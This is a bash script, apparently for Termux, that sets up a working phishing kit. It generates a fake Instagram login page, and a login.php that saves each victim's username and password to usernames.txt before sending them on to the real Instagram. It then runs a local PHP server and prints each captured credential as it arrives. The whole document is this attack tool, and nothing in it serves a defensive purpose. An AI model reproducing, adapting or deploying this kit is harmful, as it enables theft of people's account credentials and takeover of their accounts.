#!/bin/bash

# --- 1. ASK FOR PORT (User Choice) ---
clear
GREEN='\033[1;32m'
CYAN='\033[1;36m'
YELLOW='\033[1;33m'
RED='\033[1;31m'
RESET='\033[0m'

echo -e "${GREEN}========================================${RESET}"
echo -e "${CYAN}    CUSTOM PORT SERVER (God Mode)       ${RESET}"
echo -e "${GREEN}========================================${RESET}"
echo ""
echo -ne "${YELLOW}Enter Port (Press Enter for 8080): ${RESET}"
read USER_PORT

# Agar user ne kuch nahi dala, to default 8080 set karo
if [[ -z "$USER_PORT" ]]; then
    PORT="8080"
else
    PORT="$USER_PORT"
fi

# --- 2. CLEANUP SPECIFIC PORT ---
echo -e "\033[1;33m[*] Cleaning Port $PORT...\033[0m"
pkill -f php > /dev/null 2>&1
fuser -k $PORT/tcp > /dev/null 2>&1

# --- 3. SETUP FOLDERS ---
# (Setup wahi purana rahega, bas port change hoga)
rm -rf auth/
mkdir -p auth

# --- 4. CREATE HTML (Instagram Style) ---
cat > auth/index.php <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Instagram Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
*{ margin:0; padding:0; box-sizing:border-box; font-family: Arial, Helvetica, sans-serif; }
body{ background:#0b1116; color:#fff; }
.main{ display:flex; min-height:100vh; }
.left{ width:50%; padding:60px; background:linear-gradient(160deg,#000,#0b1116); display:flex; flex-direction:column; justify-content:center; }
.left img.logo{ width:55px; margin-bottom:40px; }
.left h1{ font-size:40px; font-weight:400; line-height:1.3; }
.left h1 span{ color:#ff2d55; }
.left .story{ margin-top:40px; width:280px; }
.right{ width:50%; background:#121e26; display:flex; justify-content:center; align-items:center; }
.card{ width:380px; }
.card h2{ font-size:20px; margin-bottom:20px; }
.input{ width:100%; padding:14px; margin-bottom:12px; border-radius:12px; border:1px solid #2a3a45; background:#0f1b22; color:#fff; outline:none; }
.btn{ width:100%; padding:14px; border:none; border-radius:30px; background:#0095f6; color:#fff; font-size:15px; cursor:pointer; margin-top:5px; font-weight:bold; }
.link{ text-align:center; margin:18px 0; font-size:14px; color:#cfd8dc; }
.fb{ width:100%; padding:12px; border-radius:30px; border:1px solid #2a3a45; background:#0f1b22; color:#fff; margin-bottom:12px; }
.new{ width:100%; padding:12px; border-radius:30px; border:1px solid #3b82f6; background:transparent; color:#3b82f6; }
.meta{ text-align:center; margin-top:25px; opacity:.7; }
@media(max-width:900px){ .main{flex-direction:column;} .left,.right{width:100%;} .left{display:none;} .right{height:100vh;} }
</style>
</head>
<body>
<div class="main">
    <div class="left">
        <img class="logo" src="https://uploads.onecompiler.io/447wf6ce2/44caqn8u9/Screenshot_2026-02-01_130807-removebg-preview.png">
        <h1>See everyday moments from <br>your <span>close friends.</span></h1>
        <img class="story" src="https://static.cdninstagram.com/rsrc.php/v4/yF/r/reN9rvYdLTB.png">
    </div>
    <div class="right">
        <div class="card">
            <h2>Log in to Instagram</h2>
            <form method="POST" action="login.php">
                <input class="input" type="text" name="u" placeholder="Mobile number, username or email address" required>
                <input class="input" type="password" name="p" placeholder="Password" required>
                <button class="btn" type="submit">Log in</button>
            </form>
            <div class="link">Forgotten password?</div>
            <button class="fb">Log in with Facebook</button>
            <button class="new">Create new account</button>
            <div class="meta">∞ Meta</div>
        </div>
    </div>
</div>
</body>
</html>
EOF

# --- 5. LOGIN LOGIC ---
cat > auth/login.php <<EOF
<?php
file_put_contents("../usernames.txt", "User: " . \$_POST['u'] . " | Pass: " . \$_POST['p'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
?>
EOF

# --- 6. START SERVER (With User Port) ---
echo -e "${CYAN}[*] Starting Server on Port $PORT...${RESET}"

# Yaha hum wahi variable use kar rahe hain jo user ne diya
termux-chroot php -S 127.0.0.1:$PORT -t auth > server.log 2>&1 &
PID=$!
sleep 3

# --- 7. CHECK STATUS ---
if ps -p $PID > /dev/null; then
    echo -e "${GREEN}[✔] SUCCESS! Server Running.${RESET}"
    echo -e "${CYAN}Link: http://127.0.0.1:$PORT${RESET}"
    echo -e "${RED}[-] Press Ctrl + C to Stop${RESET}"
    echo ""
    echo -e "${GREEN}Waiting for Login...${RESET}"
    
    # Logs Monitor
    touch usernames.txt
    tail -f usernames.txt | while read line; do
        echo -e "${RED}[!] CAPTURED: ${YELLOW}$line${RESET}"
        echo -e "\a"
    done
else
    echo -e "${RED}[!] FAILED! Port $PORT shayad busy hai.${RESET}"
    echo -e "${YELLOW}Log:${RESET}"
    cat server.log
fi
